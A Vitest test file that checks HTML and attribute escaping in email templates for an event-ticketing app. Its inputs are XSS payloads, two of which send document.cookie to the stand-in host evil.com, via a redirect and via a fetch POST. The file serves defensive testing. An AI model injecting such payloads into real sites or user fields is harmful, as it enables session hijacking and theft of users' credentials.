import { describe, it, expect } from 'vitest';
import { escapeHtml, escapeAttr } from '../security.js';

describe('Email template XSS prevention', () => {
  it('escapes event title for email - no executable tags', () => {
    const malicious = '<script>document.location="https://evil.com?c="+document.cookie</script>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
    expect(escaped).toContain('&lt;/script&gt;');
  });

  it('escapes customer name for email - no executable tags', () => {
    const malicious = 'John <img src=x onerror="steal()">Doe';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<img');
    expect(escaped).not.toContain('<');
  });

  it('escapes venue name for email - angle brackets gone', () => {
    const malicious = 'Stadium"><script>alert(1)</script>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('>');
    expect(escaped).toContain('&quot;');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('escapes bank account holder name - no tags', () => {
    const malicious = 'John <b>bold</b>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<b>');
    expect(escaped).toContain('&lt;b&gt;');
  });

  it('escapes bank account number in HTML context', () => {
    const malicious = '123456"><script>alert(1)</script>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('escapes notes field for email - no tags', () => {
    const malicious = '<a href="javascript:alert(1)">Click me</a>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<a ');
    expect(escaped).toContain('&lt;a');
  });

  it('escapes event language field', () => {
    const malicious = 'English<script>fetch("https://evil.com",{method:"POST",body:document.cookie})</script>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('escapes organizer name for email - no tags', () => {
    const malicious = 'TixPass"><svg onload=alert(1)>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<svg');
    expect(escaped).toContain('&lt;svg');
  });

  it('handles null event data gracefully', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('escapes deeply nested HTML injection - no tags', () => {
    const malicious = '<div><p><span><script>alert("xss")</script></span></p></div>';
    const escaped = escapeHtml(malicious);
    expect(escaped).not.toContain('<div>');
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;div&gt;');
    expect(escaped).toContain('&lt;script&gt;');
  });
});

describe('HTML attribute escaping for email', () => {
  it('escapes alt text in img tag - quotes escaped', () => {
    const malicious = ' alt="x" onerror="alert(1)" ';
    const escaped = escapeAttr(malicious);
    expect(escaped).toContain('&quot;');
  });

  it('escapes angle brackets in src attribute values', () => {
    const malicious = '<script>alert(1)</script>';
    const escaped = escapeAttr(malicious);
    expect(escaped).not.toContain('<script>');
    expect(escaped).toContain('&lt;script&gt;');
  });
});
